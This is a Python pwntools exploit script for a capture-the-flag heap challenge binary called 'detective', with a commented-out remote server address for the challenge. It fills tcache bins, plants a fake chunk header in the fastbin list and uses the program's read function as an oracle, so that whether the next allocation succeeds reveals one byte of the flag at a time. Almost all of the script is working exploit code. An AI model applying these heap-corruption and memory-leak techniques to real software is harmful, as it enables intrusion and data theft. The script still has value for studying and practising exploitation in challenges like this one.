from pwn import *


binpath = './detective'
elf = ELF(binpath)
libc = elf.libc

context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = "DEBUG"

gdbscript = '''
gef
# after menu
b *0x555555555900
ignore 1 28
'''
# io = gdb.debug([binpath], aslr=False, gdbscript=gdbscript)
# io = remote('35.221.81.216', 30001)
io = None

def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def set_flag_index(index):
    io.sendlineafter(b'index > ', b'%d' % index)
    io.recvuntil(b'>')


@debug
def alloc(index, size, data=b'A'):
    io.sendline(b'0')
    io.sendlineafter(b'index > ', b'%d' % index)
    io.sendlineafter(b'size > ', b'%d' % size)
    io.sendlineafter(b'data > ', data)
    io.recvuntil(b'>')


@debug
def dealloc(index):
    io.sendline(b'1')
    io.sendlineafter(b'index >', b'%d' % index)
    io.recvuntil(b'>')


@debug
def read(index, at):
    io.sendline(b'2')
    io.sendlineafter(b'index >', b'%d' % index)
    io.sendlineafter(b'at >', b'%d' % at)
    io.recvuntil(b'>')

set_flag_index(7)

for i in range(7):
    alloc(0, 0x18)
    dealloc(0)
for i in range(7):
    alloc(0, 0x78)
    dealloc(0)
# ignore 1 28

# pad
# print('pad')
# alloc(0, 0x78)

alloc(0, 0x78, b'B')
dealloc(0)
alloc(0, 0x18, b'C')
alloc(1, 0x18, b'D')
dealloc(1)  # fastbinsY[0x20] -> chunk_D
dealloc(0)  # fastbinsY[0x20] -> chunk_C -> chunk_D

guess = b'f'
payload = b''
payload += b'P' * ord(guess)
payload += p64(0xdeadbeef)  # fake prev_size
payload += p64(0x21)  # fake valid size
alloc(0, 0x78, payload)

read(0, 0x80)  # *((char*)&chunk_C.fd + 0x1) = flag[index]
print("Now fd of chunk linked to fastbinsY[0x20] will point to 0x00005555555597??")
print("?? will be the ascii value of the flag")
print("if '0': 0x0000555555559730")
# ignore 1 145

alloc(0, 0x18)
print("The guess is correst if the next alloc will succeed")
alloc(0, 0x18)

# guess that `flag[index] == '0'`


io.interactive()
